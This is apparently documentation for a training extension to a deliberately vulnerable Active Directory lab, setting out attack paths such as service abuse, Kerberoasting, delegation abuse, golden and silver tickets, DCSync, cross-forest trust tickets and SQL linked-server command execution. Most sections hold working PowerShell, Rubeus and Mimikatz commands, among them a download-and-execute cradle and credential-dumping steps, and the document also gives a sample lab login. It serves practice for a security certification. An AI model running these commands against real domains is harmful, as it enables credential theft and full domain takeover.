# CRTE Extension for GOAD - Attack Paths Documentation

This document outlines the attack paths and scenarios implemented by the CRTE extension for GOAD. Each attack path is designed to help you practice specific techniques covered in the CRTE certification.

## Overview of Attack Paths

The CRTE extension implements the following attack paths:

1. **Local Privilege Escalation**
2. **Kerberos Attacks**
3. **Lateral Movement Techniques**
4. **Domain Privilege Escalation**
5. **Cross-Forest Attacks**
6. **Persistence Mechanisms**
7. **Azure AD Integration Attacks**
8. **SQL Server Link Attacks**
9. **Exchange Server Attacks**

## Detailed Attack Paths

### 1. Local Privilege Escalation

#### Misconfigured Service Attack
- **Target**: Web server in north.kingandqueen.local (equivalent to us-web in us.techcorp.local)
- **Initial Access**: Log in as regular_user
- **Attack Technique**: Use PowerUp.ps1 to identify and exploit services with weak permissions
- **Commands**:
  ```powershell
  # Download and run PowerUp
  IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.100/PowerUp.ps1')
  Invoke-AllChecks
  
  # Exploit the vulnerable service
  Invoke-ServiceAbuse -Name "VulnService"
  ```

### 2. Kerberos Attacks

#### Kerberoasting
- **Target**: svc_sql in kingandqueen.local, svc_exchange in north.kingandqueen.local
- **Initial Access**: Any domain user account
- **Attack Technique**: Request service tickets and crack them offline
- **Commands**:
  ```powershell
  # Using Rubeus
  Rubeus.exe kerberoast /user:svc_sql /domain:kingandqueen.local /outfile:hashes.txt
  
  # Using PowerView
  Import-Module .\PowerView.ps1
  Request-SPNTicket -SPN "MSSQLSvc/sql.kingandqueen.local:1433"
  ```

#### AS-REP Roasting
- **Target**: user_asrep in north.kingandqueen.local
- **Initial Access**: Network access to the domain
- **Attack Technique**: Request AS-REP messages for users with Kerberos pre-authentication disabled
- **Commands**:
  ```powershell
  # Using Rubeus
  Rubeus.exe asreproast /user:user_asrep /domain:north.kingandqueen.local /outfile:asrep.txt
  ```

#### Unconstrained Delegation
- **Target**: Exchange server in north.kingandqueen.local
- **Initial Access**: Compromise the Exchange server
- **Attack Technique**: Force a domain controller to authenticate to the compromised server
- **Commands**:
  ```powershell
  # Using Rubeus to monitor for TGTs
  Rubeus.exe monitor /interval:5
  
  # Using SpoolSample to trigger authentication
  SpoolSample.exe DC02.north.kingandqueen.local EXCHANGE.north.kingandqueen.local
  ```

#### Constrained Delegation
- **Target**: SQL server in north.kingandqueen.local
- **Initial Access**: Compromise the SQL server account
- **Attack Technique**: Use S4U2Self and S4U2Proxy to impersonate users to specific services
- **Commands**:
  ```powershell
  # Using Rubeus
  Rubeus.exe s4u /user:SQL$ /domain:north.kingandqueen.local /rc4:<hash> /impersonateuser:Administrator /msdsspn:"CIFS/DC02.north.kingandqueen.local" /ptt
  ```

#### Resource-Based Constrained Delegation (RBCD)
- **Target**: DC02 in north.kingandqueen.local
- **Initial Access**: Compromise the Web server
- **Attack Technique**: Modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute
- **Commands**:
  ```powershell
  # Using PowerView to configure RBCD
  Import-Module .\PowerView.ps1
  $ComputerSid = Get-DomainComputer WEB -Properties objectsid | Select -Expand objectsid
  $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
  $SDBytes = New-Object byte[] ($SD.BinaryLength)
  $SD.GetBinaryForm($SDBytes, 0)
  Get-DomainComputer DC02 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
  
  # Using Rubeus to exploit RBCD
  Rubeus.exe s4u /user:WEB$ /domain:north.kingandqueen.local /rc4:<hash> /impersonateuser:Administrator /msdsspn:"CIFS/DC02.north.kingandqueen.local" /ptt
  ```

### 3. Lateral Movement Techniques

#### Pass-the-Hash
- **Target**: Multiple servers in north.kingandqueen.local
- **Initial Access**: Compromise a server and extract NTLM hashes
- **Attack Technique**: Use captured NTLM hashes to authenticate without knowing the plaintext password
- **Commands**:
  ```powershell
  # Using Mimikatz
  Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
  
  # Using CrackMapExec
  cme smb 192.168.56.25 -u Administrator -H <NTLM hash>
  ```

#### Pass-the-Ticket
- **Target**: Multiple servers in north.kingandqueen.local
- **Initial Access**: Compromise a server and extract Kerberos tickets
- **Attack Technique**: Use captured Kerberos tickets to authenticate to services
- **Commands**:
  ```powershell
  # Using Rubeus to extract tickets
  Rubeus.exe dump /service:krbtgt
  
  # Using Rubeus to pass the ticket
  Rubeus.exe ptt /ticket:<base64 ticket>
  ```

#### Silver Tickets
- **Target**: SQL and Exchange servers
- **Initial Access**: Compromise service account hash
- **Attack Technique**: Forge service tickets using service account NTLM hash
- **Commands**:
  ```powershell
  # Using Mimikatz
  Invoke-Mimikatz -Command '"kerberos::golden /domain:north.kingandqueen.local /sid:S-1-5-21-... /target:sql.north.kingandqueen.local /service:MSSQLSvc /rc4:<hash> /user:Administrator /ptt"'
  ```

#### Golden Tickets
- **Target**: north.kingandqueen.local domain
- **Initial Access**: Compromise the krbtgt account hash
- **Attack Technique**: Forge TGTs using the krbtgt account hash
- **Commands**:
  ```powershell
  # Using Mimikatz
  Invoke-Mimikatz -Command '"kerberos::golden /domain:north.kingandqueen.local /sid:S-1-5-21-... /rc4:<krbtgt hash> /user:Administrator /ptt"'
  ```

### 4. Domain Privilege Escalation

#### ACL Misconfigurations
- **Target**: Domain Admins group in north.kingandqueen.local
- **Initial Access**: Compromise helpdesk_admin account
- **Attack Technique**: Exploit GenericAll permission to add accounts to Domain Admins
- **Commands**:
  ```powershell
  # Using PowerView
  Import-Module .\PowerView.ps1
  Add-DomainGroupMember -Identity 'Domain Admins' -Members 'helpdesk_admin'
  ```

#### WriteDACL Exploitation
- **Target**: north.kingandqueen.local domain
- **Initial Access**: Compromise WebAdmins group member
- **Attack Technique**: Exploit WriteDACL permission to grant DCSync rights
- **Commands**:
  ```powershell
  # Using PowerView
  Import-Module .\PowerView.ps1
  Add-DomainObjectAcl -TargetIdentity 'DC=north,DC=kingandqueen,DC=local' -PrincipalIdentity 'regular_user' -Rights DCSync
  
  # Using Mimikatz to perform DCSync
  Invoke-Mimikatz -Command '"lsadump::dcsync /domain:north.kingandqueen.local /user:krbtgt"'
  ```

### 5. Cross-Forest Attacks

#### Trust Ticket Attacks
- **Target**: bastion.local from kingandqueen.local
- **Initial Access**: Compromise kingandqueen.local domain
- **Attack Technique**: Forge inter-realm TGTs using the trust key
- **Commands**:
  ```powershell
  # Using Mimikatz to extract trust key
  Invoke-Mimikatz -Command '"lsadump::trust /patch"'
  
  # Using Mimikatz to forge trust ticket
  Invoke-Mimikatz -Command '"kerberos::golden /domain:kingandqueen.local /sid:S-1-5-21-... /rc4:<trust key> /user:Administrator /service:krbtgt /target:bastion.local /ticket:trust.kirbi"'
  ```

#### SID History Abuse
- **Target**: production.local from bastion.local
- **Initial Access**: Compromise bastion.local domain
- **Attack Technique**: Exploit SID history to gain privileged access in trusted domains
- **Commands**:
  ```powershell
  # Using Mimikatz to create golden ticket with SID history
  Invoke-Mimikatz -Command '"kerberos::golden /domain:bastion.local /sid:S-1-5-21-... /sids:S-1-5-21-...-519 /rc4:<krbtgt hash> /user:Administrator /ptt"'
  ```

### 6. Azure AD Integration Attacks

#### Azure AD Connect Credential Extraction
- **Target**: us-adconnect server in north.kingandqueen.local
- **Initial Access**: Compromise the us-adconnect server
- **Attack Technique**: Extract credentials from the Azure AD Connect database
- **Commands**:
  ```powershell
  # Using AADInternals
  Import-Module .\AADInternals.ps1
  Get-AADConnectCredentials -Server us-adconnect.north.kingandqueen.local
  ```

### 7. SQL Server Link Attacks

#### Linked Server Abuse
- **Target**: SQL servers across domains
- **Initial Access**: Compromise us-mssql server
- **Attack Technique**: Use linked servers to execute commands across forest boundaries
- **Commands**:
  ```sql
  -- Enumerate linked servers
  EXEC sp_linkedservers
  
  -- Execute commands through linked servers
  EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [DB-SQLPROD]
  EXEC ('xp_cmdshell ''whoami''') AT [DB-SQLPROD]
  
  -- Chain linked servers
  EXEC ('EXEC (''xp_cmdshell ''''whoami'''''''') AT [DB-SQLSRV]') AT [DB-SQLPROD]
  ```

### 8. Exchange Server Attacks

#### Exchange Privilege Escalation
- **Target**: Exchange server in north.kingandqueen.local
- **Initial Access**: Compromise regular_user account
- **Attack Technique**: Abuse Exchange management roles for privilege escalation
- **Commands**:
  ```powershell
  # Using PowerView to check Exchange permissions
  Import-Module .\PowerView.ps1
  Get-DomainUser regular_user | Get-DomainObjectAcl
  
  # Using PowerShell to exploit Exchange permissions
  Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
  Add-ADPermission -Identity "DC=north,DC=kingandqueen,DC=local" -User "regular_user" -ExtendedRights Replication-Get-Changes-All
  ```

## Initial Access

To begin practicing these attack paths, use the following credentials for initial access:

- **Username**: regular_user
- **Password**: Password123!
- **Domain**: north.kingandqueen.local

This account has limited permissions but can be used as a starting point for the attack scenarios.

## Tools Required

The following tools are useful for exploiting these attack paths:

1. **PowerShell Empire/PowerSploit**: For PowerShell-based attacks
2. **Mimikatz**: For credential dumping and ticket manipulation
3. **Rubeus**: For Kerberos attacks
4. **BloodHound**: For Active Directory reconnaissance
5. **Impacket**: For various network protocol attacks
6. **CrackMapExec**: For network lateral movement

Most of these tools are pre-installed on the student machine in the GOAD environment.

## Validation

To validate that each attack path is properly configured, you can use the validation script:

```powershell
.\validate.ps1
```

This script will check that all necessary components are in place for each attack scenario.
